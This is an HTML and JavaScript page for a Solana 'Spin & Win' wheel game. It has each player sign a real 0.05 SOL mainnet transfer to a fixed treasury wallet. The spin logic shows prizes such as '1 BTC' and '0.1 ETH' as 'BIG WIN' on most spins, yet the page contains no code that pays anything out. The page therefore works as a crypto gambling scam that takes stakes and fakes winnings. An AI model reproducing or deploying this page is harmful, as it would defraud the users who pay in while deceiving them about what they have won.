<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="appTitle">Solana Vortex Spin</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <!-- Confetti Effect -->
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <!-- Tone.js (Sound Effects) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.8.49/Tone.min.js"></script>
    <!-- FontAwesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* Premium Fonts */
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700;900&family=Space+Grotesk:wght@400;700&display=swap');
        
        :root {
            --bg-dark: #030014;
            --primary-neon: #a855f7; /* Purple */
            --secondary-neon: #00f0ff; /* Cyan */
            --accent-gold: #ffd700;
            --glass-bg: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.08);
        }

        body {
            font-family: 'Outfit', sans-serif;
            background-color: var(--bg-dark);
            color: white;
            overflow-x: hidden;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* --- Dynamic Background --- */
        .cyber-bg {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% 0%, #1e1b4b 0%, #020617 100%);
            z-index: -2;
        }
        .grid-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: 
                linear-gradient(rgba(168, 85, 247, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(168, 85, 247, 0.1) 1px, transparent 1px);
            background-size: 60px 60px;
            mask-image: radial-gradient(circle at center, black 30%, transparent 80%);
            z-index: -1;
            animation: gridMove 20s linear infinite;
        }
        @keyframes gridMove {
            0% { transform: translateY(0); }
            100% { transform: translateY(60px); }
        }

        /* --- Glassmorphism Components --- */
        .glass-panel {
            background: var(--glass-bg);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid var(--glass-border);
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
        }
        .glass-panel:hover {
            border-color: rgba(255, 255, 255, 0.2);
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.15);
        }

        /* --- Typography --- */
        h1.hero-title {
            font-family: 'Space Grotesk', sans-serif;
            background: linear-gradient(135deg, #fff 0%, #a855f7 50%, #00f0ff 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px rgba(168, 85, 247, 0.3);
            letter-spacing: -1px;
        }

        /* --- The Wheel --- */
        .wheel-halo {
            position: relative;
            padding: 4px;
            border-radius: 50%;
            background: conic-gradient(from 0deg, var(--primary-neon), transparent, var(--secondary-neon), transparent, var(--primary-neon));
            animation: spinHalo 10s linear infinite;
            box-shadow: 0 0 60px rgba(168, 85, 247, 0.2);
        }
        @keyframes spinHalo { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .wheel-container {
            position: relative;
            border-radius: 50%;
            background: #0f172a;
            z-index: 10;
            box-shadow: inset 0 0 50px #000;
        }

        .stopper-container {
            position: absolute;
            top: -24px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 20;
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.8));
        }

        /* --- Buttons --- */
        .neon-btn {
            position: relative;
            background: linear-gradient(90deg, var(--primary-neon), #7c3aed);
            color: white;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 2px;
            overflow: hidden;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .neon-btn::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            transition: 0.5s;
        }
        .neon-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.6);
            border-color: rgba(255,255,255,0.4);
        }
        .neon-btn:hover:not(:disabled)::before {
            left: 100%;
        }
        .neon-btn:disabled {
            background: #1e293b;
            color: #475569;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* --- Canvas Animations --- */
        canvas { transition: transform 6s cubic-bezier(0.2, 0.8, 0.1, 1); }
    </style>
</head>
<body class="flex flex-col items-center justify-center p-4">

    <!-- Backgrounds -->
    <div class="cyber-bg"></div>
    <div class="grid-overlay"></div>

    <!-- Navigation -->
    <nav class="fixed top-0 left-0 w-full p-6 flex justify-between items-center z-50">
        <!-- Logo Area -->
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-blue-500 flex items-center justify-center shadow-lg shadow-purple-500/20">
                <i class="fa-solid fa-gem text-white"></i>
            </div>
            <span class="hidden md:block font-bold text-xl tracking-tight">VORTEX<span class="text-purple-400">SPIN</span></span>
        </div>

        <!-- Wallet Controls -->
        <div class="flex gap-4">
            <div class="glass-panel px-5 py-2 rounded-2xl hidden md:flex flex-col items-end justify-center min-w-[120px]">
                <span class="text-[10px] text-gray-400 uppercase font-bold tracking-wider">Your Balance</span>
                <span id="walletBalance" class="text-lg font-bold text-white font-mono leading-none">--</span>
            </div>
            
            <button id="connectWalletBtn" class="glass-panel px-6 py-3 rounded-2xl font-bold text-sm hover:bg-white/5 flex items-center gap-2 group border-l-2 border-purple-500">
                <i class="fa-solid fa-wallet text-purple-400 group-hover:text-white transition-colors"></i>
                <span id="walletAddress">Connect Wallet</span>
            </button>
        </div>
    </nav>

    <!-- Main Game UI -->
    <main class="relative z-10 flex flex-col items-center justify-center w-full max-w-5xl mt-24 md:mt-0">
        
        <!-- Header -->
        <div class="text-center mb-12 relative">
            <h1 class="hero-title text-5xl md:text-8xl font-black uppercase mb-4">
                Spin & Win
            </h1>
            <div class="inline-flex items-center gap-2 glass-panel px-6 py-2 rounded-full border border-purple-500/30 shadow-[0_0_20px_rgba(168,85,247,0.2)]">
                <div class="w-2 h-2 rounded-full bg-green-400 animate-pulse"></div>
                <span class="text-sm font-semibold text-gray-200 tracking-wide">ENTRY: <span class="text-purple-300 font-bold">0.05 SOL</span></span>
            </div>
        </div>

        <!-- Wheel Assembly -->
        <div class="relative mb-12 scale-90 md:scale-100 transition-transform">
            <!-- Stopper -->
            <div class="stopper-container">
                <svg width="60" height="70" viewBox="0 0 60 70" fill="none">
                    <path d="M30 70L5 20C5 20 0 10 10 5C20 0 50 0 60 5C70 10 65 20 65 20L30 70Z" fill="url(#stopperGradient)"/>
                    <defs>
                        <linearGradient id="stopperGradient" x1="30" y1="0" x2="30" y2="70" gradientUnits="userSpaceOnUse">
                            <stop offset="0" stop-color="#fff"/>
                            <stop offset="0.5" stop-color="#a855f7"/>
                            <stop offset="1" stop-color="#4c1d95"/>
                        </linearGradient>
                    </defs>
                    <filter id="glow">
                        <feGaussianBlur stdDeviation="2.5" result="coloredBlur"/>
                        <feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge>
                    </filter>
                </svg>
            </div>
            
            <!-- Halo Ring -->
            <div class="wheel-halo p-[3px] rounded-full">
                <!-- Inner Container -->
                <div class="wheel-container bg-gray-900 rounded-full overflow-hidden p-2">
                    <canvas id="wheelCanvas" width="500" height="500"></canvas>
                </div>
            </div>

            <!-- Center Pivot -->
            <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-20 pointer-events-none">
                 <div class="w-24 h-24 rounded-full bg-[#0f172a] border-4 border-purple-500/50 flex items-center justify-center shadow-[0_0_30px_rgba(168,85,247,0.4)] relative">
                    <i class="fa-solid fa-bolt text-4xl text-transparent bg-clip-text bg-gradient-to-br from-purple-400 to-cyan-400"></i>
                 </div>
            </div>
        </div>

        <!-- Controls Area -->
        <div class="w-full max-w-sm text-center space-y-5">
            <!-- Status Text -->
            <div id="statusMessage" class="h-6 text-sm font-medium tracking-wide text-purple-300/80 font-mono"></div>

            <!-- Main Button -->
            <button id="spinBtn" class="neon-btn w-full py-5 rounded-2xl text-2xl shadow-2xl flex items-center justify-center gap-3" disabled>
                <i class="fa-solid fa-lock text-sm opacity-70" id="btnIcon"></i>
                <span id="btnText">Connect Wallet</span>
            </button>
            
            <!-- Warning Note -->
            <div class="glass-panel rounded-xl p-3 flex items-start gap-3 text-left">
                <i class="fa-solid fa-circle-info text-blue-400 mt-0.5"></i>
                <div>
                    <p class="text-[10px] text-gray-400 uppercase font-bold mb-1">Important</p>
                    <p class="text-xs text-gray-300 leading-tight">Payments are settled in <span class="text-white font-bold">SOL (Solana)</span>. Ensure you have enough gas fees.</p>
                </div>
            </div>
        </div>

    </main>

    <!-- Wallet Modal -->
    <div id="walletModal" class="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-[100] hidden opacity-0 transition-opacity duration-300">
        <div class="glass-panel border-purple-500/20 p-8 rounded-3xl text-center max-w-sm w-full mx-4">
            <h3 class="text-2xl font-bold text-white mb-2 font-sans">Connect Wallet</h3>
            <p class="text-gray-400 text-sm mb-6">Choose your preferred Solana provider</p>
            
            <div class="space-y-3">
                <button onclick="connect('backpack')" class="w-full glass-panel hover:bg-white/5 hover:border-blue-500 text-white p-4 rounded-xl transition flex items-center justify-between group">
                    <div class="flex items-center gap-4">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c9/Backpack_Logo.png/640px-Backpack_Logo.png" class="w-8 h-8 rounded-lg">
                        <span class="font-bold text-lg">Backpack</span>
                    </div>
                    <i class="fa-solid fa-chevron-right text-gray-600 group-hover:text-blue-500"></i>
                </button>
                
                <button onclick="connect('phantom')" class="w-full glass-panel hover:bg-white/5 hover:border-purple-500 text-white p-4 rounded-xl transition flex items-center justify-between group">
                    <div class="flex items-center gap-4">
                        <img src="https://cryptologos.cc/logos/phantom-phantom-logo.png" class="w-8 h-8 rounded-lg">
                        <span class="font-bold text-lg">Phantom</span>
                    </div>
                    <i class="fa-solid fa-chevron-right text-gray-600 group-hover:text-purple-500"></i>
                </button>
            </div>
            
            <button onclick="closeModal('walletModal')" class="mt-8 text-xs text-gray-500 hover:text-white uppercase tracking-widest font-bold">Close</button>
        </div>
    </div>

    <!-- Result Modal -->
    <div id="resultModal" class="fixed inset-0 bg-black/95 backdrop-blur-2xl flex items-center justify-center z-[100] hidden opacity-0 transition-opacity duration-500">
        <div class="glass-panel border-purple-500/40 p-10 rounded-[2rem] text-center max-w-sm w-full mx-4 relative overflow-hidden transform scale-95 transition-transform duration-300" id="resultCard">
            <!-- Background Glow -->
            <div class="absolute inset-0 bg-gradient-to-b from-purple-500/10 to-transparent pointer-events-none"></div>
            
            <div id="resIcon" class="text-7xl mb-6 block transform hover:scale-110 transition filter drop-shadow-[0_0_30px_rgba(168,85,247,0.6)]">ðŸ’Ž</div>
            
            <h2 id="resTitle" class="text-4xl font-black text-white mb-2 uppercase tracking-wide">WIN</h2>
            <div class="h-1 w-20 bg-gradient-to-r from-purple-500 to-cyan-500 rounded-full mx-auto my-6"></div>
            <p id="resMsg" class="text-xl text-gray-200 mb-10 font-light">You won 0.5 SOL</p>
            
            <button onclick="closeModal('resultModal')" class="w-full bg-white text-black font-bold py-4 rounded-xl hover:scale-[1.02] transition uppercase tracking-widest shadow-xl">
                Spin Again
            </button>
        </div>
    </div>

    <script>
        // === CONFIGURATION ===
        const CONFIG = {
            treasury: "DAwS12Yo6sF5isULcCQ24rhU67J7vHjRHsH5TjfYerFE", // Hazine CÃ¼zdanÄ±
            amount: 0.05,
            rpc: "https://api.mainnet-beta.solana.com"
        };

        // === WALLET CORE ===
        const Wallet = {
            provider: null,
            publicKey: null,
            connection: new solanaWeb3.Connection(CONFIG.rpc, 'confirmed'),

            getProvider(type) {
                if (type === 'backpack') return window.backpack;
                if (type === 'phantom') {
                    const isPhantom = window.phantom?.solana?.isPhantom || window.solana?.isPhantom;
                    if (isPhantom) return window.phantom?.solana || window.solana;
                }
                return null;
            },

            async connect(type) {
                const provider = this.getProvider(type);
                if (!provider) {
                    window.open('https://phantom.app/', '_blank');
                    throw new Error(`${type} not detected.`);
                }
                try {
                    const resp = await provider.connect();
                    this.provider = provider;
                    this.publicKey = resp.publicKey.toString();
                    
                    provider.on('disconnect', () => this.disconnect());
                    provider.on('accountChanged', (pk) => {
                        if(pk) { this.publicKey = pk.toString(); UI.update(true); }
                        else this.disconnect();
                    });
                    return this.publicKey;
                } catch (err) {
                    throw new Error("Connection failed.");
                }
            },

            async disconnect() {
                try { if(this.provider) await this.provider.disconnect(); } catch(e){}
                this.provider = null;
                this.publicKey = null;
                UI.update(false);
            },

            async sendTransaction() {
                if (!this.provider || !this.publicKey) throw new Error("Wallet not connected");

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: new solanaWeb3.PublicKey(this.publicKey),
                        toPubkey: new solanaWeb3.PublicKey(CONFIG.treasury),
                        lamports: Math.floor(CONFIG.amount * solanaWeb3.LAMPORTS_PER_SOL)
                    })
                );

                const { blockhash, lastValidBlockHeight } = await this.connection.getLatestBlockhash('finalized');
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = new solanaWeb3.PublicKey(this.publicKey);

                const { signature } = await this.provider.signAndSendTransaction(transaction);
                const conf = await this.connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight });
                if (conf.value.err) throw new Error("Transaction failed.");
                return signature;
            }
        };

        // === UI CONTROLLER ===
        const UI = {
            els: {
                btn: document.getElementById('connectWalletBtn'),
                addr: document.getElementById('walletAddress'),
                bal: document.getElementById('walletBalance'),
                spinBtn: document.getElementById('spinBtn'),
                spinTxt: document.getElementById('btnText'),
                spinIcon: document.getElementById('btnIcon'),
                status: document.getElementById('statusMessage')
            },

            async update(connected) {
                if (connected && Wallet.publicKey) {
                    this.els.addr.innerText = Wallet.publicKey.slice(0,4) + '..' + Wallet.publicKey.slice(-4);
                    this.els.spinBtn.disabled = false;
                    this.els.spinTxt.innerText = "SPIN NOW";
                    this.els.spinIcon.className = "fa-solid fa-bolt";
                    this.els.btn.classList.add('border-purple-400', 'bg-purple-500/20');
                    this.setStatus("Wallet Connected", "text-green-400");
                    try {
                        const bal = await Wallet.connection.getBalance(new solanaWeb3.PublicKey(Wallet.publicKey));
                        this.els.bal.innerText = (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(3) + " SOL";
                    } catch(e) { this.els.bal.innerText = "Err"; }
                } else {
                    this.els.addr.innerText = "Connect Wallet";
                    this.els.bal.innerText = "--";
                    this.els.spinBtn.disabled = true;
                    this.els.spinTxt.innerText = "Connect Wallet";
                    this.els.spinIcon.className = "fa-solid fa-lock";
                    this.els.btn.classList.remove('border-purple-400', 'bg-purple-500/20');
                    this.setStatus("", "");
                }
            },
            setStatus(msg, colorClass) {
                this.els.status.innerText = msg;
                this.els.status.className = `h-6 text-sm font-medium tracking-wide ${colorClass}`;
            }
        };

        // === GAME LOGIC ===
        let isSpinning = false;
        
        window.addEventListener('DOMContentLoaded', () => {
            initPremiumWheel();
            
            document.getElementById('connectWalletBtn').onclick = () => {
                if(Wallet.publicKey) Wallet.disconnect();
                else openModal('walletModal');
            };

            document.getElementById('spinBtn').onclick = async () => {
                if(isSpinning) return;
                
                UI.els.spinBtn.disabled = true;
                UI.els.spinTxt.innerText = "PROCESSING...";
                UI.els.spinIcon.className = "fa-solid fa-circle-notch fa-spin";
                UI.setStatus("Check your wallet...", "text-yellow-400");

                try {
                    await Wallet.sendTransaction();
                    UI.setStatus("Success! Spinning...", "text-green-400");
                    UI.update(true); 
                    isSpinning = true;
                    await spinWheel();
                } catch (err) {
                    let msg = "Transaction Failed";
                    if(err.message.includes("rejected")) msg = "User Cancelled";
                    UI.setStatus(msg, "text-red-500");
                    UI.els.spinBtn.disabled = false;
                    UI.els.spinTxt.innerText = "SPIN NOW";
                    UI.els.spinIcon.className = "fa-solid fa-bolt";
                    isSpinning = false;
                }
            };
        });

        window.connect = async (type) => {
            closeModal('walletModal');
            try {
                UI.setStatus("Connecting...", "text-blue-400");
                await Wallet.connect(type);
                UI.update(true);
            } catch(e) { UI.setStatus(e.message, "text-red-500"); }
        };

        // === PREMIUM WHEEL RENDERER ===
        function initPremiumWheel() {
            const canvas = document.getElementById('wheelCanvas');
            const ctx = canvas.getContext('2d');
            
            // Neon / Dark Theme Palette
            const prizes = [
                { txt: "1 BTC", type:'win', c1: "#F59E0B", c2: "#B45309" }, // Gold
                { txt: "EMPTY", type:'miss', c1: "#1e293b", c2: "#0f172a" }, // Dark Blue
                { txt: "LOSS", type:'miss', c1: "#334155", c2: "#1e293b" },  // Gray Blue
                { txt: "EMPTY", type:'miss', c1: "#1e293b", c2: "#0f172a" },
                { txt: "0.5 SOL", id:'SOL', type:'win', c1: "#a855f7", c2: "#7e22ce" }, // Purple
                { txt: "EMPTY", type:'miss', c1: "#1e293b", c2: "#0f172a" },
                { txt: "LOSS", type:'miss', c1: "#334155", c2: "#1e293b" },
                { txt: "50 XRP", type:'win', c1: "#0ea5e9", c2: "#0369a1" }, // Cyan
                { txt: "EMPTY", type:'miss', c1: "#1e293b", c2: "#0f172a" },
                { txt: "REKT", type:'bad', c1: "#ef4444", c2: "#b91c1c" }, // Red
                { txt: "0.1 ETH", type:'win', c1: "#6366f1", c2: "#4338ca" }, // Indigo
                { txt: "EMPTY", type:'miss', c1: "#1e293b", c2: "#0f172a" },
                { txt: "LOSS", type:'miss', c1: "#334155", c2: "#1e293b" },
                { txt: "DOGE", type:'win', c1: "#fbbf24", c2: "#d97706" }, // Orange
                { txt: "EMPTY", type:'miss', c1: "#1e293b", c2: "#0f172a" },
                { txt: "50 USDT", type:'win', c1: "#10b981", c2: "#047857" }, // Green
            ];

            const num = prizes.length;
            const slice = (2 * Math.PI) / num;
            let rotation = 0;

            function draw() {
                const W = canvas.width;
                const H = canvas.height;
                const cx = W/2;
                const cy = H/2;
                const R = (W/2); 
                
                ctx.clearRect(0,0,W,H);

                // Slices
                prizes.forEach((p, i) => {
                    const startAng = i * slice;
                    const endAng = (i+1) * slice;
                    
                    ctx.beginPath();
                    ctx.moveTo(cx, cy);
                    ctx.arc(cx, cy, R, startAng, endAng);
                    ctx.lineTo(cx, cy);
                    
                    // Rich Gradient
                    const grad = ctx.createRadialGradient(cx, cy, 20, cx, cy, R);
                    grad.addColorStop(0, p.c2);
                    grad.addColorStop(1, p.c1);
                    
                    ctx.fillStyle = grad;
                    ctx.fill();
                    
                    // Borders
                    ctx.strokeStyle = "rgba(0,0,0,0.4)";
                    ctx.lineWidth = 2;
                    ctx.stroke();

                    // Text
                    ctx.save();
                    ctx.translate(cx, cy);
                    ctx.rotate(startAng + slice/2);
                    ctx.textAlign = "right";
                    
                    // Glowing Text
                    ctx.shadowColor = "rgba(0,0,0,0.8)";
                    ctx.shadowBlur = 4;
                    
                    ctx.fillStyle = "#fff";
                    if (p.type === 'miss') ctx.fillStyle = "#64748b";
                    
                    ctx.font = "bold 15px Outfit";
                    ctx.fillText(p.txt, R - 20, 5);
                    ctx.restore();
                });

                // Center Vignette
                const vig = ctx.createRadialGradient(cx, cy, R-40, cx, cy, R);
                vig.addColorStop(0, "transparent");
                vig.addColorStop(1, "rgba(0,0,0,0.3)");
                ctx.beginPath();
                ctx.arc(cx, cy, R, 0, 2*Math.PI);
                ctx.fillStyle = vig;
                ctx.fill();
            }

            draw();

            window.spinWheel = async () => {
                if(window.Tone) { try{await Tone.start(); new Tone.MembraneSynth().toDestination().triggerAttackRelease("C2", "8n");}catch(e){} }
                
                // Logic
                const rnd = Math.random();
                let targetId = null;
                if(rnd < 0.1) targetId = 'SOL';

                let targets = [];
                prizes.forEach((p, i) => {
                    if(targetId && p.id === targetId) targets.push(i);
                    else if(!targetId && !p.id) targets.push(i);
                });
                const winIdx = targets[Math.floor(Math.random()*targets.length)];

                // Rotation Math
                const sliceDeg = 360/num;
                const targetAngle = (winIdx * sliceDeg) + (sliceDeg/2);
                let rot = targetAngle + 90; 
                rot += (Math.random() * (sliceDeg-10)) - (sliceDeg/2 - 5);
                
                const finalRot = (8 * 360) + (rot - (rotation % 360));
                rotation += finalRot;

                canvas.style.transform = `rotate(-${rotation}deg)`;

                return new Promise(resolve => {
                    setTimeout(() => {
                        showResult(prizes[winIdx]);
                        resolve();
                    }, 6000);
                });
            };
        }

        function showResult(prize) {
            const t = document.getElementById('resTitle');
            const msg = document.getElementById('resMsg');
            const icn = document.getElementById('resIcon');

            if(prize.type === 'win') {
                t.innerText = "BIG WIN";
                t.className = "text-5xl font-black text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-cyan-400 mb-2 font-sans tracking-tight";
                msg.innerText = `You won ${prize.txt}`;
                icn.innerText = "ðŸ’Ž";
                
                // Neon Confetti
                confetti({
                    particleCount: 150, 
                    spread: 100, 
                    origin: { y: 0.6 }, 
                    colors: ['#a855f7', '#00f0ff', '#ffffff']
                });
                
                if(window.Tone) new Tone.PolySynth(Tone.Synth).toDestination().triggerAttackRelease(["C4", "E4", "G4", "C5"], "8n");
            } else {
                t.innerText = "NO LUCK";
                t.className = "text-4xl font-black text-gray-500 mb-2 font-sans";
                msg.innerText = "Try again next time";
                icn.innerText = "ðŸ’¨";
            }
            openModal('resultModal');
        }

        // Modal Helpers
        function openModal(id) {
            const m = document.getElementById(id);
            m.classList.remove('hidden');
            setTimeout(()=>m.classList.remove('opacity-0'),10);
        }
        window.closeModal = (id) => {
            const m = document.getElementById(id);
            m.classList.add('opacity-0');
            setTimeout(()=>m.classList.add('hidden'),300);
        }
    </script>
</body>
</html>
